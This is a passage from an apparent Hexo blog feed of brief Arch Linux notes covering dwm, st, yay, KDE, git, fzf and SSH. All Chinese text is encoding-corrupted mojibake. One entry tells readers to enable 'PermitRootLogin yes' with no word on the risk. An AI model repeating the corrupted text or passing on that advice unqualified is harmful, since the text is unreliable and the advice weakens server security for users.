éƒ½å¯ä»¥ä½¿ç”¨.</p><h1 id="fzf-tmux-script"><a href="#fzf-tmux-script" class="headerlink" title="fzf-tmux script"></a><code>fzf-tmux</code> script</h1><p>å…·ä½“çœ‹ github, æš‚æ—¶ä¸äº†è§£ã€‚</p><h1 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h1><p><a href="https://b23.tv/qSnllig">å‚è€ƒ</a><br>ä¹Ÿå¯ä»¥åœ¨ <code>man fzf</code> ä¸­æŸ¥æ‰¾ä¿¡æ¯.</p><p>å‡ ä¸ªç¯å¢ƒå˜é‡.</p><h2 id="åœ¨-vim-ä¸­ä½¿ç”¨-fzf"><a href="#åœ¨-vim-ä¸­ä½¿ç”¨-fzf" class="headerlink" title="åœ¨ vim ä¸­ä½¿ç”¨ fzf"></a>åœ¨ vim ä¸­ä½¿ç”¨ fzf</h2>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>git clone --depth å«ä¹‰</title>
    <link href="/2022/09/03/git-clone-depth-%E5%90%AB%E4%B9%89/"/>
    <url>/2022/09/03/git-clone-depth-%E5%90%AB%E4%B9%89/</url>
    
    <content type="html"><![CDATA[<p><code>git clone --depth=1</code> æ„æ€å°±æ˜¯å…‹éš†ä¸‹è½½æœ€è¿‘ä¸€æ¬¡ commit çš„ä¸€ä¸ªåˆ†æ”¯. è¿™æ ·ç‰ˆæœ¬é¡¹ç›®æ–‡ä»¶å°±ä¸ä¼šå¾ˆå¤§.</p>]]></content>
    
    
    <categories>
      
      <category>Git</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>çª—å£ç®¡ç†å™¨ dwm å’Œ ç»ˆç«¯ st</title>
    <link href="/2022/09/03/%E7%AA%97%E5%8F%A3%E7%AE%A1%E7%90%86%E5%99%A8-dwm-%E5%92%8C-%E7%BB%88%E7%AB%AF-st/"/>
    <url>/2022/09/03/%E7%AA%97%E5%8F%A3%E7%AE%A1%E7%90%86%E5%99%A8-dwm-%E5%92%8C-%E7%BB%88%E7%AB%AF-st/</url>
    
    <content type="html"><![CDATA[<p><a href="https://suckless.org/">suckless å®˜ç½‘</a><br>suckless æ˜¯ä¸€ä¸ªå¼€æºç¤¾åŒº. å…¶æ˜¯ä¸€ä¸ªæç®€ä¸»ä¹‰çš„çˆ±å¥½è€….</p><h1 id="st"><a href="#st" class="headerlink" title="st"></a>st</h1><p>st æ˜¯ simple terminal.</p><h1 id="dwm"><a href="#dwm" class="headerlink" title="dwm"></a>dwm</h1><p>dwm æ˜¯ dynamic window manager, åŠ¨æ€çª—å£ç®¡ç†å™¨.</p><p>dwm æ˜¯ X ä¸‹çš„ä¸€ä¸ªåŠ¨æ€çª—å£ç®¡ç†å™¨.</p><h2 id="Xorg"><a href="#Xorg" class="headerlink" title="Xorg"></a>Xorg</h2><p><a href="https://wiki.archlinux.org/title/Xorg">ArchWiki</a><br>X.org é¡¹ç›®ï¼Œå…¶æä¾›äº† X çª—å£ç³»ç»Ÿçš„å¼€æºå®ç°.</p><p>Xorg ç®€ç§° X, å‡ ä¹æ˜¯ Linux ä¸­å›¾å½¢ç”¨æˆ·ç¨‹åºçš„å¿…å¤‡æ¡ä»¶.</p><p>å…¶æ½œåœ¨çš„ç»§ä»»è€…ä¸º <code>Wayland</code>.</p><h3 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><p>ç”¨æˆ·é€šå¸¸é€‰æ‹©å®‰è£…çª—å£ç®¡ç†å™¨æˆ–æ¡Œé¢ç¯å¢ƒä»¥é…åˆä½¿ç”¨ X.</p><p>ä¸€èˆ¬ä¸º:</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta">pacman -S xorg xorg-<span class="hljs-keyword">server</span><br></code></pre></td></tr></table></figure><h4 id="é©±åŠ¨å®‰è£…"><a href="#é©±åŠ¨å®‰è£…" class="headerlink" title="é©±åŠ¨å®‰è£…"></a>é©±åŠ¨å®‰è£…</h4><p>æŸ¥çœ‹æ˜¾å¡ç±»å‹:</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">lspci <span class="hljs-string">|grep -e VGA -e 3D</span><br></code></pre></td></tr></table></figure><p>æœ‰å‡ ä¸ªè¾“å‡ºè¯´æ˜æœ‰å‡ ä¸ªæ˜¾å¡.</p><p>æŸ¥çœ‹æ‰€æœ‰å¼€æºé©±åŠ¨:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">pacman -Ss xf86-<span class="hljs-selector-tag">video</span><br></code></pre></td></tr></table></figure><p><img src="/../img/%E9%A9%B1%E5%8A%A8.png" alt="é©±åŠ¨"></p><h3 id="è¿è¡Œ"><a href="#è¿è¡Œ" class="headerlink" title="è¿è¡Œ"></a>è¿è¡Œ</h3><p>Xorg å‘½ä»¤é€šå¸¸ä¸ç›´æ¥è¿è¡Œï¼Œè€Œæ˜¯ä½¿ç”¨æ˜¾ç¤ºç®¡ç†å™¨æˆ–è€… xinit æ¥å¯åŠ¨ X server.</p><h3 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h3><p>Arch æä¾›äº†ä½äº <code>/usr/share/X11/xorg.conf.d</code> çš„é»˜è®¤é…ç½®æ–‡ä»¶.</p><h1 id="dwm-1"><a href="#dwm-1" class="headerlink" title="dwm"></a>dwm</h1><h2 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h2><h3 id="æ‰“å¼€ç»ˆç«¯"><a href="#æ‰“å¼€ç»ˆç«¯" class="headerlink" title="æ‰“å¼€ç»ˆç«¯"></a>æ‰“å¼€ç»ˆç«¯</h3><p><code>[Shift]+[Alt]+[Enter]</code></p><h3 id="æ‰“å¼€-dmenu"><a href="#æ‰“å¼€-dmenu" class="headerlink" title="æ‰“å¼€ dmenu"></a>æ‰“å¼€ dmenu</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-attr">[Alt]</span>+<span class="hljs-selector-tag">p</span><br></code></pre></td></tr></table></figure><h3 id="åˆ‡æ¢-master-window-å’Œ-stack-window"><a href="#åˆ‡æ¢-master-window-å’Œ-stack-window" class="headerlink" title="åˆ‡æ¢ master window å’Œ stack window"></a>åˆ‡æ¢ master window å’Œ stack window</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-attr">[Alt]</span>+<span class="hljs-selector-attr">[Enter]</span><br></code></pre></td></tr></table></figure><h3 id="Moving-Aroung"><a href="#Moving-Aroung" class="headerlink" title="Moving Aroung"></a>Moving Aroung</h3><p><code>  [Alt]+[j]</code><br>æˆ–è€…<br><code>  [Alt]+[k]</code></p><h3 id="å°†ä¸€ä¸ªå°çª—å£ç§»åŠ¨åˆ°å…¶ä»–-Tab-ä¸­"><a href="#å°†ä¸€ä¸ªå°çª—å£ç§»åŠ¨åˆ°å…¶ä»–-Tab-ä¸­" class="headerlink" title="å°†ä¸€ä¸ªå°çª—å£ç§»åŠ¨åˆ°å…¶ä»– Tab ä¸­"></a>å°†ä¸€ä¸ªå°çª—å£ç§»åŠ¨åˆ°å…¶ä»– Tab ä¸­</h3><p>å¦‚</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-attr">[Alt]</span>+<span class="hljs-selector-attr">[Shift]</span>+<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>ä¼šæŠŠå½“å‰çš„è¿™ä¸€ä¸ª window ç§»åŠ¨åˆ° tab 2 ä¸­ã€‚</p><h3 id="è¿›å…¥å…¶ä»–çš„-Tab"><a href="#è¿›å…¥å…¶ä»–çš„-Tab" class="headerlink" title="è¿›å…¥å…¶ä»–çš„ Tab"></a>è¿›å…¥å…¶ä»–çš„ Tab</h3><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">[Alt]+[<span class="hljs-literal">Tab</span> <span class="hljs-built_in">number</span>]<br></code></pre></td></tr></table></figure><h3 id="é€‰æ‹©ä¸€ä¸ª-window-ä½œä¸º-master"><a href="#é€‰æ‹©ä¸€ä¸ª-window-ä½œä¸º-master" class="headerlink" title="é€‰æ‹©ä¸€ä¸ª window ä½œä¸º master"></a>é€‰æ‹©ä¸€ä¸ª window ä½œä¸º master</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-attr">[Alt]</span>+<span class="hljs-selector-tag">i</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„ <code>i</code> ä¸º increase.</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-string">[Alt]</span>+d<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„ <code>d</code> ä¸º decrease.</p><h3 id="å…³é—­ä¸€ä¸ª-window"><a href="#å…³é—­ä¸€ä¸ª-window" class="headerlink" title="å…³é—­ä¸€ä¸ª window"></a>å…³é—­ä¸€ä¸ª window</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-attr">[Alt]</span>+<span class="hljs-selector-attr">[Shift]</span>+c<br></code></pre></td></tr></table></figure><h3 id="é€€å‡º-dwm"><a href="#é€€å‡º-dwm" class="headerlink" title="é€€å‡º dwm"></a>é€€å‡º dwm</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-attr">[Alt]</span>+<span class="hljs-selector-attr">[Shift]</span>+<span class="hljs-selector-tag">q</span><br></code></pre></td></tr></table></figure><h2 id="é…ç½®-1"><a href="#é…ç½®-1" class="headerlink" title="é…ç½®"></a>é…ç½®</h2><h3 id="å‡ ä¸ªè¡¥ä¸åŠå…¶ä½œç”¨"><a href="#å‡ ä¸ªè¡¥ä¸åŠå…¶ä½œç”¨" class="headerlink" title="å‡ ä¸ªè¡¥ä¸åŠå…¶ä½œç”¨"></a>å‡ ä¸ªè¡¥ä¸åŠå…¶ä½œç”¨</h3><p>alpha : çŠ¶æ€æ é€æ˜.</p><p>autostart : è‡ªåŠ¨å¯åŠ¨è„šæœ¬çš„åŠŸèƒ½</p><p>awesomebar : çŠ¶æ€æ æ˜¾ç¤ºåç§°</p><p>alpha : çŠ¶æ€æ é€æ˜.</p><p>autostart : è‡ªåŠ¨å¯åŠ¨è„šæœ¬çš„åŠŸèƒ½</p><p>awesomebar : çŠ¶æ€æ æ˜¾ç¤ºåç§°</p><p>fullscreen : å®Œå…¨å…¨å±</p><p>hide-and-restore : éšè—ä¸€ä¸ªçª—å£</p><p>hide_vacant_tags : åªæ˜¾ç¤ºæ˜¯æœ‰çª—å£çš„ tags.</p><p>pertag : æ¯ä¸ªçª—å£å¯ä»¥æœ‰ä¸åŒçš„ç®¡ç†æ¨¡å¼</p><p>viewontag : åœ¨ç§»åŠ¨æ ‡ç­¾æ—¶ç”¨æˆ·ä¹Ÿè·Ÿç€ç§»åŠ¨.</p><p>rotatestack : è°ƒæ•´ stack </p><p>scratchpad : æ‰“å¼€ä¸€ä¸ªå°çª—å£</p><p>vanitygaps : çª—å£ä¹‹é—´çš„å°ç©ºéš™</p><p><code>.diff</code> æ–‡ä»¶å°±æ˜¯å‘Šè¯‰æ‰“è¡¥ä¸çš„å·¥å…·éœ€è¦åœ¨æºä»£ç ä¸ŠåŠ ä¸Šå“ªäº›è¡Œ, åˆ é™¤å“ªäº›è¡Œ.</p><h3 id="å¼€æœºå¯åŠ¨é¡¹"><a href="#å¼€æœºå¯åŠ¨é¡¹" class="headerlink" title="å¼€æœºå¯åŠ¨é¡¹"></a>å¼€æœºå¯åŠ¨é¡¹</h3><p>å…ˆæ‰“ä¸Š autostart è¿™ä¸ªè¡¥ä¸, ç„¶åæŸ¥çœ‹ <code>dwm.c</code> æ–‡ä»¶é‡Œé¢çš„ <code>Autostart</code> è¿™ä¸ªå‡½æ•°, å®ƒä¼šå¸®æˆ‘ä»¬å¯åŠ¨ä¸€ä¸ªè„šæœ¬:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript">    <span class="hljs-keyword">void</span><br>    <span class="hljs-title function_">runAutostart</span>(<span class="hljs-params"><span class="hljs-keyword">void</span></span>) &#123;<br>        <span class="hljs-title function_">system</span>(<span class="hljs-string">&quot;cd ~/scripts; ./autostart.sh &amp;&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>system</code> è¿™ä¸ªå‘½ä»¤æ˜¯æ‰§è¡Œä¸€ä¸ªç³»ç»Ÿå‘½ä»¤.</p><p>éœ€è¦ä¸‹è½½è¡¨æƒ…å­—ä½“.</p><p>trayer ç¨‹åº, æ˜¾ç¤ºç³»ç»Ÿæ‰˜ç›˜.</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>yay -S trayer<br></code></pre></td></tr></table></figure><p>åœ¨ dwm ä¸‹å®šä¹‰å¿«æ·é”®, ä¿®æ”¹ <code>config.h</code> æ–‡ä»¶ä¸­çš„ <code>static Key keys[]</code>.</p><p>MODKEY ç¼ºçœçŠ¶æ€æ˜¯ [Alt] é”®.</p><h3 id="é…ç½®çŠ¶æ€æ¡"><a href="#é…ç½®çŠ¶æ€æ¡" class="headerlink" title="é…ç½®çŠ¶æ€æ¡"></a>é…ç½®çŠ¶æ€æ¡</h3><p>ä½¿ç”¨ <code>xsetroot</code> å‘½ä»¤.</p><h3 id="åœ¨ä¸ç™»å‡ºå’Œé€€å‡ºç¨‹åºçš„æƒ…å†µä¸‹é‡å¯-dwm"><a href="#åœ¨ä¸ç™»å‡ºå’Œé€€å‡ºç¨‹åºçš„æƒ…å†µä¸‹é‡å¯-dwm" class="headerlink" title="åœ¨ä¸ç™»å‡ºå’Œé€€å‡ºç¨‹åºçš„æƒ…å†µä¸‹é‡å¯ dwm"></a>åœ¨ä¸ç™»å‡ºå’Œé€€å‡ºç¨‹åºçš„æƒ…å†µä¸‹é‡å¯ dwm</h3><p>æ·»åŠ :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">while</span> <span class="hljs-literal">true</span>; <span class="hljs-keyword">do</span><br>    <span class="hljs-comment"># Log stderror to a file </span><br>    dwm 2&gt; ~/.dwm.log<br>    <span class="hljs-comment"># No error logging</span><br>    <span class="hljs-comment">#dwm &gt;/dev/null 2&gt;&amp;1</span><br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><h3 id="è‡ªå®šä¹‰å¿«æ·é”®"><a href="#è‡ªå®šä¹‰å¿«æ·é”®" class="headerlink" title="è‡ªå®šä¹‰å¿«æ·é”®"></a>è‡ªå®šä¹‰å¿«æ·é”®</h3><p>å•ä¸ªæŒ‰é”®å¦‚ Fn æˆ–å¤šåª’ä½“é”®å¿…é¡»è¦ç”¨ 16 è¿›åˆ¶æ•°æ¥è¡¨ç¤º, å¯ä»¥ç”¨ xev ç¨‹åºæ¥è·å¾—, æˆ–è€…æŸ¥çœ‹ <code>/usr/include/X11/XF86keysym.h</code> ä¸­çš„å®šä¹‰.</p><p>å®šä¹‰ keybindname çš„å†…å®¹:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-type">char</span> *&lt;keybindname&gt;[]   = &#123; <span class="hljs-string">&quot;&lt;command&gt;&quot;</span>, <span class="hljs-string">&quot;&lt;flags&gt;&quot;</span>, <span class="hljs-string">&quot;&lt;arguments&gt;&quot;</span>, <span class="hljs-literal">NULL</span> &#125;;&#125;<br></code></pre></td></tr></table></figure><p>ç”¨ Mod+<key> æ¥æ‰§è¡Œå‘½ä»¤:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&#123; MODKEY,            XK_<span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>,      spawn,          &#123;.v = <span class="hljs-tag">&lt;<span class="hljs-name">keybindname</span>&gt;</span> &#125; &#125;,<br></code></pre></td></tr></table></figure><p>ç”¨ Mod+Shift+<key> æ¥æ‰§è¡Œå‘½ä»¤:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&#123; MODKEY|ShiftMask,  XK_<span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>,      spawn,          &#123;.v = <span class="hljs-tag">&lt;<span class="hljs-name">keybindname</span>&gt;</span> &#125; &#125;,<br></code></pre></td></tr></table></figure><p>ç”¨ Mod+Ctrl+<key> æ¥æ‰§è¡Œå‘½ä»¤:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&#123; MODKEY|ControlMask,  XK_<span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>,      spawn,          &#123;.v = <span class="hljs-tag">&lt;<span class="hljs-name">keybindname</span>&gt;</span> &#125; &#125;,<br></code></pre></td></tr></table></figure><p>grave é”®å°±æ˜¯ <code>~</code> æ‰€å¤„çš„ä½ç½®.</p><h3 id="æ”¹å˜é—´éš™"><a href="#æ”¹å˜é—´éš™" class="headerlink" title="æ”¹å˜é—´éš™"></a>æ”¹å˜é—´éš™</h3><p><code>gappov</code> è¿™ä¸ªæ˜¯å’Œå·¦è¾¹çš„é—´éš™.</p><p><code>gappoh</code> æ˜¯å’Œä¸‹é¢çš„é—´éš™.</p>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Arch ä¸­çš„ Yay</title>
    <link href="/2022/09/02/Arch-%E4%B8%AD%E7%9A%84-Yay/"/>
    <url>/2022/09/02/Arch-%E4%B8%AD%E7%9A%84-Yay/</url>
    
    <content type="html"><![CDATA[<p>yay æ˜¯ä¸€ä¸ª AUR helperï¼Œå…¶ä¼šå¸®ä½ ä» AUR å®‰è£…è½¯ä»¶.</p><h1 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h1><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">git <span class="hljs-keyword">clone</span> <span class="hljs-title">https</span>://aur.archlinux.org/yay.git --<span class="hljs-attr">depth=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>è¿›å…¥ç›®å½•åæ‰§è¡Œ:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">makepkg -si</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥é€šè¿‡:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">pacman -Qs yay</span><br></code></pre></td></tr></table></figure><p>æ¥æŸ¥çœ‹æœ¬æœºå®‰è£…çš„ yay ç¨‹åº.</p><h1 id="ä¸Šè¿°å®‰è£…æ—¶å¯èƒ½ä¼šæŠ¥é”™"><a href="#ä¸Šè¿°å®‰è£…æ—¶å¯èƒ½ä¼šæŠ¥é”™" class="headerlink" title="ä¸Šè¿°å®‰è£…æ—¶å¯èƒ½ä¼šæŠ¥é”™"></a>ä¸Šè¿°å®‰è£…æ—¶å¯èƒ½ä¼šæŠ¥é”™</h1><p>ä½¿ç”¨å¦ä¸€ç§æ–¹æ³•å®‰è£…, å…ˆæ·»åŠ  archlinuxcn çš„æº</p><h2 id="å¼€å¯-32-ä½è½¯ä»¶åº“æ”¯æŒå’Œ-ArchlinuxCN-åº“çš„æ”¯æŒ"><a href="#å¼€å¯-32-ä½è½¯ä»¶åº“æ”¯æŒå’Œ-ArchlinuxCN-åº“çš„æ”¯æŒ" class="headerlink" title="å¼€å¯ 32 ä½è½¯ä»¶åº“æ”¯æŒå’Œ ArchlinuxCN åº“çš„æ”¯æŒ"></a>å¼€å¯ 32 ä½è½¯ä»¶åº“æ”¯æŒå’Œ ArchlinuxCN åº“çš„æ”¯æŒ</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo vim <span class="hljs-regexp">/etc/</span>pacman.conf<br></code></pre></td></tr></table></figure><p>å°† <code>[multilib]</code> ä¸€èŠ‚ä¸­çš„ä¸¤è¡Œæ³¨é‡Šå»æ‰.</p><p>åœ¨æ–‡æ¡£çš„æœ€åæ·»åŠ :</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">[archlinuxcn]<br>Server = https:<span class="hljs-regexp">//mi</span>rrors.ustc.edu.cn<span class="hljs-regexp">/archlinuxcn/</span><span class="hljs-variable">$arch</span><br></code></pre></td></tr></table></figure><p>æ‰§è¡Œ <code>sudo pacman -Syyu</code> æ›´æ–° pacman æ•°æ®åº“.</p><p>å®‰è£… <code>archlinuxcn-keyring</code> åŒ…å¯¼å…¥ GPG key:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo pacman -S archlinuxcn-keyring</span><br></code></pre></td></tr></table></figure><p>è‹¥æŠ¥é”™ï¼Œåˆ™æ‰§è¡Œä»¥ä¸‹å‘½ä»¤:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">sudo pacman -Syyu<br>sudo pacman -S haveged<br>sudo pacman -Syu haveged<br>sudo systemctl <span class="hljs-keyword">start</span> haveged<br>sudo systemctl <span class="hljs-keyword">enable</span> haveged<br><br>sudo rm -fr /etc/pacman.d/gnupg<br>sudo pacman-key <span class="hljs-comment">--init</span><br>sudo pacman-key <span class="hljs-comment">--populate archlinux</span><br>sudo pacman-key <span class="hljs-comment">--populate archlinuxcn</span><br></code></pre></td></tr></table></figure><p>æœ€åå®‰è£… <code>yay</code>:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo pacman -S yay</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ArchWiki ä¸­ KDE éƒ¨åˆ†</title>
    <link href="/2022/09/02/ArchWiki-%E4%B8%AD-KDE-%E9%83%A8%E5%88%86/"/>
    <url>/2022/09/02/ArchWiki-%E4%B8%AD-KDE-%E9%83%A8%E5%88%86/</url>
    
    <content type="html"><![CDATA[<p><a href="https://wiki.archlinux.org/title/KDE">ArchWiki</a><br>é¦–å…ˆï¼ŒKDE æ˜¯ä¸€å¥—ç”± Plasma æ¡Œé¢ç¯å¢ƒã€ä¸€ç³»åˆ—çš„åº“ã€æ¡†æ¶ (KDE Frameworks) å’Œä¸€äº›åº”ç”¨ç»„æˆçš„è½¯ä»¶é¡¹ç›®.</p><p>æ‰€ä»¥è¯´ï¼ŒPlasma æ‰æ˜¯æ¡Œé¢ç¯å¢ƒ, KDE åªæ˜¯è½¯ä»¶é¡¹ç›®.</p><h1 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h1><h2 id="Plasma-æ¡Œé¢"><a href="#Plasma-æ¡Œé¢" class="headerlink" title="Plasma æ¡Œé¢"></a>Plasma æ¡Œé¢</h2><p>å®‰è£… Plasma ä¹‹å‰éœ€å®‰è£… Xorg ä¾èµ–:</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta">sudo pacman -S xorg xorg-<span class="hljs-keyword">server</span><br></code></pre></td></tr></table></figure><p>å®‰è£… plasma-meta å…ƒè½¯ä»¶åŒ…:</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">sudo pacman -S plasma-<span class="hljs-keyword">meta</span><br></code></pre></td></tr></table></figure><h1 id="å¯åŠ¨-Plasma"><a href="#å¯åŠ¨-Plasma" class="headerlink" title="å¯åŠ¨ Plasma"></a>å¯åŠ¨ Plasma</h1><p>è‹¥ä½¿ç”¨ <code>xinit/startx</code> å¯åŠ¨ Plasma æ¡Œé¢ï¼Œåœ¨ <code>.xinitrc</code> æ–‡ä»¶ä¸­æ·»åŠ  <code>export DESKTOP_SESSION=plasma</code></p><h1 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h1><p>KDE åº”ç”¨å¤§éƒ¨åˆ†é…ç½®å­˜å‚¨äº <code>~/.config</code> ç›®å½•ä¸‹.</p><h2 id="å¤´åƒ"><a href="#å¤´åƒ" class="headerlink" title="å¤´åƒ"></a>å¤´åƒ</h2><p>Plasma å’Œ SDDM éƒ½ä¼šä½¿ç”¨å­˜åœ¨ <code>/var/lib/AccountsService/icons/</code> çš„å›¾åƒä½œä¸ºç”¨æˆ·å¤´åƒ.</p>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ssh è¿œç¨‹è¿æ¥æ—¶ permission denied</title>
    <link href="/2022/09/02/ssh-%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5%E6%97%B6-permission-denied/"/>
    <url>/2022/09/02/ssh-%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5%E6%97%B6-permission-denied/</url>
    
    <content type="html"><![CDATA[<p>å¯èƒ½å­˜åœ¨ä¸‰ç§æƒ…å†µ:</p><ol><li>æ£€æŸ¥å¹¶ç¡®å®šå¯†ç æœ‰æ²¡æœ‰é”™è¯¯</li><li>æŸ¥çœ‹ç”¨æˆ·åæ˜¯å¦å­˜åœ¨</li><li>è‹¥æ˜¯ç™»å½• root è´¦æˆ·ï¼Œä¸€èˆ¬æ˜¯é…ç½®æ–‡ä»¶ä¸­å°† root è®¾ç½®ä¸ºä¸å…è®¸è¿œç¨‹ç™»å½•.</li></ol><p>sshd çš„é…ç½®æ–‡ä»¶ä¸º <code>/etc/ssh/sshd_config</code>.</p><p>ä¿®æ”¹ä¸ºå…è®¸ root è¿œç¨‹ç™»å½•, å³æ·»åŠ ä¸€è¡Œ <code>PermitRootLogin yes</code>.</p>]]></content>
    
    
    <categories>
      
      <category>Errors</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ä»€ä¹ˆæ˜¯ dhcpcd, e2fsprogs, iwd</title>
    <link href="/2022/09/02/%E4%BB%80%E4%B9%88%E6%98%AF-dhcpcd-e2fsprogs-iwd/"/>
    <url>/2022/09/02/%E4%BB%80%E4%B9%88%E6%98%AF-dhcpcd-e2fsprogs-iwd/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äºæ“ä½œç³»ç»Ÿåœ¨ PATH è·¯å¾„ä¸‹æŸ¥æ‰¾å‘½ä»¤</title>
    <link href="/2022/09/02/%E5%85%B3%E4%BA%8E%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%9C%A8-PATH-%E8%B7%AF%E5%BE%84%E4%B8%8B%E6%9F%A5%E6%89%BE%E5%91%BD%E4%BB%A4/"/>
    <url>/2022/09/02/%E5%85%B3%E4%BA%8E%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%9C%A8-PATH-%E8%B7%AF%E5%BE%84%E4%B8%8B%E6%9F%A5%E6%89%BE%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<p>ä¸ä¼šé€’å½’æŸ¥æ‰¾ <code>$PATH</code> ä¸­æ·»åŠ ç›®å½•ä¹‹ä¸‹çš„å­ç›®å½•.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å°† hexo åšå®¢ä¸Šä¼ åˆ° gitee</title>
    <link href="/2022/09/02/%E5%B0%86-hexo-%E5%8D%9A%E5%AE%A2%E4%B8%8A%E4%BC%A0%E5%88%B0-gitee/"/>
